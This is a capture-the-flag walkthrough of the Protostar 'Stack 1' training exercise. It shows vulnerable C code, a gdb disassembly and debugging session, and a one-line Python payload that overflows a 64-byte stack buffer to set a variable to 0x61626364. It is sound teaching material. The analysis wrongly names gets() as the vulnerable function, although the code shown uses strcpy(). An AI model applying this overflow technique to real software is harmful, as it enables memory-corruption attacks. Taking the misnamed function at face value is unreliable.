# PROTOSTAR : STACK 1
[Protostar:Stack1](https://exploit.education/protostar/stack-one/)

### SOURCE CODE

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

### **CODE ANALYSIS**
#### Vulnerability
- Stack Buffer Overflow

Same as the previous level we are going to exploit the **gets()**
function since it is vulnerable to Buffer Overflow attacks. After overflowing we need to pass the value keeping **LITTLE ENDIAN** in mind.

### **SOLUTION**

Below is the disassembly of **main()**
```
user@protostar:/opt/protostar/bin$ gdb -q stack1
Reading symbols from /opt/protostar/bin/stack1...done.
(gdb) set disassembly-flavor intel
(gdb) disass main
Dump of assembler code for function main:
0x08048464 <main+0>:    push   ebp
0x08048465 <main+1>:    mov    ebp,esp
0x08048467 <main+3>:    and    esp,0xfffffff0
0x0804846a <main+6>:    sub    esp,0x60
0x0804846d <main+9>:    cmp    DWORD PTR [ebp+0x8],0x1
0x08048471 <main+13>:   jne    0x8048487 <main+35>
0x08048473 <main+15>:   mov    DWORD PTR [esp+0x4],0x80485a0
0x0804847b <main+23>:   mov    DWORD PTR [esp],0x1
0x08048482 <main+30>:   call   0x8048388 <errx@plt>
0x08048487 <main+35>:   mov    DWORD PTR [esp+0x5c],0x0
0x0804848f <main+43>:   mov    eax,DWORD PTR [ebp+0xc]
0x08048492 <main+46>:   add    eax,0x4
0x08048495 <main+49>:   mov    eax,DWORD PTR [eax]
0x08048497 <main+51>:   mov    DWORD PTR [esp+0x4],eax
0x0804849b <main+55>:   lea    eax,[esp+0x1c]
0x0804849f <main+59>:   mov    DWORD PTR [esp],eax
0x080484a2 <main+62>:   call   0x8048368 <strcpy@plt>
0x080484a7 <main+67>:   mov    eax,DWORD PTR [esp+0x5c]
0x080484ab <main+71>:   cmp    eax,0x61626364
0x080484b0 <main+76>:   jne    0x80484c0 <main+92>
0x080484b2 <main+78>:   mov    DWORD PTR [esp],0x80485bc
0x080484b9 <main+85>:   call   0x8048398 <puts@plt>
0x080484be <main+90>:   jmp    0x80484d5 <main+113>
0x080484c0 <main+92>:   mov    edx,DWORD PTR [esp+0x5c]
0x080484c4 <main+96>:   mov    eax,0x80485f3
0x080484c9 <main+101>:  mov    DWORD PTR [esp+0x4],edx
0x080484cd <main+105>:  mov    DWORD PTR [esp],eax
0x080484d0 <main+108>:  call   0x8048378 <printf@plt>
0x080484d5 <main+113>:  leave  
0x080484d6 <main+114>:  ret    
End of assembler dump.
(gdb) 
```

1. At **0x0804846d** there is a comparison of ebp+0x8 with 1. This line is checking if the user has suppied any command line arguments or not.

2. At **0x080484ab** there is another comparison, checks whether the value of eax is equal to 0x61626364.
    - If true prints "**you have correctly got the variable to the right value\n**"

    - If false eip goes to **0x80484c0** and prints "**Try again, you got 0x%08x\n", modified**"

Set up a breakpoint at **0x080484a7** and Passing input.
We can see the program overflows the **modified** variable and changes it to **0x41** but we need **0x61626364**. Lets write a python script.
```
(gdb) b *0x080484a7
Breakpoint 1 at 0x80484a7: file stack1/stack1.c, line 18.
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Starting program: /opt/protostar/bin/stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, main (argc=2, argv=0xbffff804) at stack1/stack1.c:18
18      stack1/stack1.c: No such file or directory.
        in stack1/stack1.c
(gdb) c
Continuing.
Try again, you got 0x00000041

Program exited with code 036.
(gdb) 
```

### **PYTHON SCRIPT**
```
user@protostar:/opt/protostar/bin$ ./stack1 $(python -c "print 'A'*64 + 'dcba'")
you have correctly got the variable to the right value
```
We correctly changed the value of **modified** variable and keep in mind to pass the value in **LITTLE ENDIAN**. The string "dcba" will be stored in reverse in little endian and in hex values.
